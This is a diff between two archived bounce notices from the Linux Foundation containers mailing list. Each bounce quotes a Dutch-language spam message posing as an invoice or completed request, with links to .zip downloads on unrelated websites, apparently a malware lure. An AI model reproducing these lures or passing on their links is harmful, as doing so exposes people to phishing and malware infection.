@@ -1,13 +1,11 @@
-From: <postmaster-5gIye892DIE@public.gmane.org>
-Subject: Undeliverable: Re: document 1179
-Date: Thu, 1 Mar 2012 07:37:59 +0100
-Message-ID: <4f759dda-8d3a-4033-a412-039cfbc2a36a@whw.nl>
-References: <5071506724.03948506667238@srv1157.sd-france.net>
+From: MAILER-DAEMON-xId6df0K6k9FKHX/5f8+YWZHpeb/A1Y/@public.gmane.org
+Subject: failure notice
+Date: 1 Mar 2012 07:34:31 -0000
+Message-ID: <20120301073437.0CB8E584@mail.linuxfoundation.org>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="===============2385285593203255671=="
+Content-Type: text/plain; charset="us-ascii"
+Content-Transfer-Encoding: 7bit
 Return-path: <containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-Content-Language: en-US
-In-Reply-To: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
 List-Unsubscribe: <https://lists.linuxfoundation.org/mailman/options/containers>,
 	<mailto:containers-request-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org?subject=unsubscribe>
 List-Archive: <http://lists.linuxfoundation.org/pipermail/containers/>
@@ -20,160 +18,60 @@ Errors-To: containers-bounces-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public
 To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
---===============2385285593203255671==
-Content-Type: multipart/report; report-type=delivery-status;
-	boundary="66e13c68-cb9e-473d-af44-b626caae7ae0"
-Content-Language: en-US
+Hi. This is the qmail-send program at qmail30.zonnet.nl.
+I'm afraid I wasn't able to deliver your message to the following addresses.
+This is a permanent error; I've given up. Sorry it didn't work out.
+---------------------------------------------------------------------
+Het volgende bericht dat u stuurde aan deze gebruiker is niet aangekomen.
+De meest voorkomende redenen zijn:
+- het verkeerd intypen van het e-mailadres of het e-mailadres bestaat niet.
+- de mailbox van de ontvangende gebruiker is vol waardoor er geen e-mail meer wo
+rdt geaccepteerd.
+- het e-mailbericht stond in de wachtrij en kon in de afgelopen 3 dagen niet wor
+den afgeleverd.
+--------------------------------------------------------------------
+The following email that you sent to this user has not been received.
+The most occuring reasons are:
+- wrongly typed e-mailaddress or the e-mailaddress doesn't exist.
+- the e-mailbox of the receiving user is full and therefore the e-mail won't be
+accepted.
+- the e-mailmessage was in queue and couldn't be delivered in the past 3 days.
+---------------------------------------------------------------------
 
---66e13c68-cb9e-473d-af44-b626caae7ae0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: quoted-printable
+<marton-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org>:
+The users mailfolder is over the allowed quota (size).
 
-Delivery has failed to these recipients or groups:
+--- Below this line is a copy of the message.
 
-maldonado-5gIye892DIE@public.gmane.org<mailto:maldonado-5gIye892DIE@public.gmane.org>
-The e-mail address you entered couldn't be found. Check the address and try=
- resending the message. If the problem continues, please contact your helpd=
-esk.
-
-
-
-
-
-
-
-
-Diagnostic information for administrators:
-
-Generating server: whw.nl
-
-maldonado-5gIye892DIE@public.gmane.org
-#550 5.1.1 RESOLVER.ADR.RecipNotFound; not found ##
-
-Original message headers:
-
-Received: from filter02.mx-relay.com (81.173.18.240) by
- SRVEXCHANGE.whwbedrijven.lan (192.168.0.2) with Microsoft SMTP Server id
- 14.0.722.0; Thu, 1 Mar 2012 07:37:58 +0100
-X-ASG-Debug-ID: 1330583869-03ead9766a12a410001-D4Zj2N
-Received: from srv1157.sd-france.net (srv1157.sd-france.net [81.93.250.157]=
-)
- by filter02.mx-relay.com with ESMTP id y3UYTZSMZ837X2bc for
- <maldonado-5gIye892DIE@public.gmane.org>; Thu, 01 Mar 2012 07:37:51 +0100 (CET)
-X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-Barracuda-Apparent-Source-IP: 81.93.250.157
-Received: from [81.93.250.157] by srv1157.sd-france.net id w4NSZfp7a6fj wit=
-h
- SMTP; Thu, 01 Mar 2012 07:39:48 +0100
-Date: Thu, 1 Mar 2012 07:39:48 +0100
-From: Consult Group <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.4.63.5) Educational
+Return-Path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: (qmail 5106 invoked by uid 0); 1 Mar 2012 07:34:31 -0000
+Received: from unknown ([10.170.1.116])
+          (envelope-sender <>)
+          by qmail30.zonnet.nl (qmail-ldap-1.03) with QMQP
+          for < >; 1 Mar 2012 07:34:31 -0000
+Delivered-To: CLUSTERHOST mail1.versatel.nl marton-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org
+Received: (qmail 20974 invoked by uid 0); 1 Mar 2012 07:34:29 -0000
+Received: from srv1157.sd-france.net ([81.93.250.157])
+          (envelope-sender <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+          by mail1.versatel.nl (qmail-ldap-1.03) with SMTP
+          for < >; 1 Mar 2012 07:34:29 -0000
+Received: from [81.93.250.157] by srv1157.sd-france.net id Isyz8kbtmTLh with SMTP; Thu, 01 Mar 2012 08:36:22 +0100
+Date: Thu, 01 Mar 2012 08:36:22 +0100
+From: "Pay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+X-Mailer: The Bat! (v4.4.55.6) Home
 X-Priority: 3 (Normal)
-Message-ID: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
-To: <maldonado-5gIye892DIE@public.gmane.org>
-Subject: Re: document 1179
+Message-ID: <71314739.01430431190944-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
+To: <marton-RSh1/+X/PmFmR6Xm/wNWPw@public.gmane.org>
+Subject: Bill
 MIME-Version: 1.0
-X-ASG-Orig-Subj: Re: document 1179
-Content-Type: text/plain; charset=3D"windows-1252"
+Content-Type: text/plain;
+	charset="windows-1252"
 Content-Transfer-Encoding: 8bit
-X-Barracuda-Connect: srv1157.sd-france.net[81.93.250.157]
-X-Barracuda-Start-Time: 1330583869
-X-Barracuda-URL: http://filter01.mx-relay.com:8000/cgi-mod/mark.cgi
-X-Virus-Scanned: by bsmtpd at mx-relay.com
-X-Barracuda-Spam-Score: 0.85
-X-Barracuda-Spam-Status: No, SCORE=3D0.85 using global scores of TAG_LEVEL=
-=3D3.5 QUARANTINE_LEVEL=3D1000.0 KILL_LEVEL=3D6.0 tests=3DFORGED_MUA_THEBAT=
-_CS
-X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.89939
-        Rule breakdown below
-         pts rule name              description
-        ---- ---------------------- ---------------------------------------=
------------
-        0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (ch=
-arset)
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-ESET-AS: SCORE=3D30
-X-EsetResult: clean, is OK
-X-EsetId: 4F25C621A7484D31146299
-
-
---66e13c68-cb9e-473d-af44-b626caae7ae0
-Content-Type: message/delivery-status
-
-Reporting-MTA: dns;whw.nl
-Received-From-MTA: dns;filter02.mx-relay.com
-Arrival-Date: Thu, 1 Mar 2012 06:37:58 +0000
-
-Final-Recipient: rfc822;maldonado-5gIye892DIE@public.gmane.org
-Action: failed
-Status: 5.1.1
-Diagnostic-Code: smtp;550 5.1.1 RESOLVER.ADR.RecipNotFound; not found
-
-
---66e13c68-cb9e-473d-af44-b626caae7ae0
-Content-Type: message/rfc822
-
-Received: from filter02.mx-relay.com (81.173.18.240) by
- SRVEXCHANGE.whwbedrijven.lan (192.168.0.2) with Microsoft SMTP Server id
- 14.0.722.0; Thu, 1 Mar 2012 07:37:58 +0100
-X-ASG-Debug-ID: 1330583869-03ead9766a12a410001-D4Zj2N
-Received: from srv1157.sd-france.net (srv1157.sd-france.net [81.93.250.157])
- by filter02.mx-relay.com with ESMTP id y3UYTZSMZ837X2bc for
- <maldonado-5gIye892DIE@public.gmane.org>; Thu, 01 Mar 2012 07:37:51 +0100 (CET)
-X-Barracuda-Envelope-From: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-Barracuda-Apparent-Source-IP: 81.93.250.157
-Received: from [81.93.250.157] by srv1157.sd-france.net id w4NSZfp7a6fj with
- SMTP; Thu, 01 Mar 2012 07:39:48 +0100
-Date: Thu, 1 Mar 2012 07:39:48 +0100
-From: Consult Group <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
-X-Mailer: The Bat! (v4.4.63.5) Educational
-X-Priority: 3 (Normal)
-Message-ID: <5071506724.03948506667238-//J07LhNTfpNmCTVG0Af2SpxlwaOVQ5f@public.gmane.org>
-To: <maldonado-5gIye892DIE@public.gmane.org>
-Subject: Re: document 1179
-MIME-Version: 1.0
-X-ASG-Orig-Subj: Re: document 1179
-Content-Type: text/plain; charset="windows-1252"
-Content-Transfer-Encoding: quoted-printable
-X-Barracuda-Connect: srv1157.sd-france.net[81.93.250.157]
-X-Barracuda-Start-Time: 1330583869
-X-Barracuda-URL: http://filter01.mx-relay.com:8000/cgi-mod/mark.cgi
-X-Virus-Scanned: by bsmtpd at mx-relay.com
-X-Barracuda-Spam-Score: 0.85
-X-Barracuda-Spam-Status: No, SCORE=0.85 using global scores of TAG_LEVEL=3.5 QUARANTINE_LEVEL=1000.0 KILL_LEVEL=6.0 tests=FORGED_MUA_THEBAT_CS
-X-Barracuda-Spam-Report: Code version 3.2, rules version 3.2.2.89939
-	Rule breakdown below
-	 pts rule name              description
-	---- ---------------------- --------------------------------------------------
-	0.85 FORGED_MUA_THEBAT_CS   Mail pretending to be from The Bat! (charset)
-Return-Path: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-X-ESET-AS: SCORE=30
-X-EsetResult: clean, is OK
-X-EsetId: 4F25C621A7484D31146299
-
-
-       =20
-goede morgen,
-
-Uw aanvraag is voltooid.
-Sorry voor de late rapport.
-       =20
-
-Details zijn te vinden in een document hier
-http://www.immobiliarezardo.it/downloadpdf/nl/Invoice.zip
 
 
 
---66e13c68-cb9e-473d-af44-b626caae7ae0--
+         
+Beste,
 
---===============2385285593203255671==
-Content-Type: text/plain; charset="us-ascii"
-MIME-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Content-Disposition: inline
-
-_______________________________________________
-Containers mailing list
-Containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
-https://lists.linuxfoundation.org/mailman/listinfo/containers
---===============2385285593203255671==--
+Factuur link:
+http://www.eurodatanet.biz/downloadpdf/nl/Info.zip?ID10391605
